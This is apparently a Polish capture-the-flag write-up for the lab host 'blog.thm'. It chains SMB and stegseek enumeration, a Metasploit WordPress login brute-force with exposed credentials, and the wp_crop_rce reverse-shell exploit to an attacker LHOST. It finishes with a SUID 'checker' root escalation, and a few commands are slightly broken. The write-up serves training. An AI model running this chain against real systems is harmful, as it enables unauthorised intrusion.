@@ -1,0 +1,193 @@
+Project 20 - Wykorzsytanie narzędzia Stegseek.
+Manualna eumeracja strony internetowej.
+
+
+*Rekonesans*
+*Enumeracja za pomocą Nmap*
+```bash
+nmap -sC -sV 10.10.43.171
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-18 06:55 EST
+Nmap scan report for blog.thm (10.10.43.171)
+Host is up (0.057s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 578ada90baed3a470c05a3f7a80a8d78 (RSA)
+|   256 c264efabb19a1c87587c4bd50f204626 (ECDSA)
+|_  256 5af26292118ead8a9b23822dad53bc16 (ED25519)
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
+|_http-generator: WordPress 5.0
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+*Enumeracja za pomocą enum4linux*
+```bash
+enum4linux -U -S blog.thm
+
+ Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        BillySMB        Disk      Billy's local SMB Share
+        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            BLOG
+
+[+] Attempting to map shares on blog.thm                                                                                                                                                     
+                                                                                                                                                                                             
+//blog.thm/print$       Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                            
+//blog.thm/BillySMB     Mapping: OK Listing: OK Writing: N/A
+```
+
+*SMB*
+```bash
+smbclient //blog.thm/BillySMB
+password: Nacisnąć Enter
+
+get Alice-White-Rabbit.jpg 
+get tswift.mp4
+get check-this.png
+```
+
+*Stegseek*
+```bash
+git clone https://github.com/RickdeJager/stegseek.git
+
+stegseek Alice-White-RAbbit.jpg /Zadania/rockyou.txt
+
+stegseek tswift.mp4 /Zadania/rockyou.txt
+
+stegseek check-this.png /Zadania/rockyou.txt
+
+stegseek --crack -sf steg.jpg -wl wordlist.txt [-xf output.txt]
+```
+
+
+*Strona internetowa*
+```bash
+http://blog.thm
+Ctrl+U
+
+http://blog.thm/robots.txt
+
+User-agent: *
+Disallow: /wp-admin/
+Allow: /wp-admin/admin-ajax.php
+
+```
+
+*Searchsploit*
+```bash
+searchsploit wordpress 5.0
+
+Wystartowanie bazy danych:
+sudo msfdb init
+```
+
+*Wpscan*
+```
+wpscan blog.thm 
+```
+
+*Zamiast używać wpscan można eumerować stronę internetową manualnie*
+```
+http://blog.thm/?author=1
+username: bjoel
+
+http://blog.thm/?author=2
+
+http://blog.thm/?author=3
+username: kwheel
+
+http://blog.thm/wp-json/wp/v2/users
+```
+
+*3000 pierwszych haseł z listy rockyou.txt*
+```bash
+head -n 3000 rockyou.txt > rockyou_3000.txt
+```
+
+*msfconsole*
+```
+search wordpress_login_enum
+use auxiliary/scanner/http/wordpress_login_enum
+set PASS_FILE rockyou_3000.txt
+set USER_FILE usernames.txt
+set RHOSTS blog.thm
+run
+```
+*Poświadczenia*
+```
+login: kwheel
+password: cutiepie1
+```
+
+*Strona internetowa*
+```
+http://blog.thm/wp-login.php
+login: kwheel
+password: cutiepie1
+```
+
+
+*msfconsole*
+```
+search wordpress 5.0
+use exploit/multi/http/wp_crop_rce
+set PASSWORD cutiepie1
+set RHOSTS blog.thm
+set USERNAME kwheel
+set LHOST 10.14.32.12
+exploit
+```
+
+**Połączenie zostało nawiązane**
+
+*Użytkownik www-data*
+Stabilizacja powłoki
+```bash
+shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+cd /home
+cd bjoel
+find / -name user.txt 2>dev/null
+cd /home/bjoel
+
+sudo -l
+
+find / -perm -u=s 2> /dev/null
+which ltrace
+Wynik: /usr/bin/ltrace
+/usr/bin/checker
+ltrace checker
+
+env
+
+export admin=0
+ltrace checker
+
+checker
+```
+**Zostało nawiązane połaczenie z użytkownikiem root !!!**
+
+*Eksploitacja*
+```bash
+find / -name user.txt 2>dev/null
+cat /media/usb/user.txt
+
+cd /root/root.txt
+```
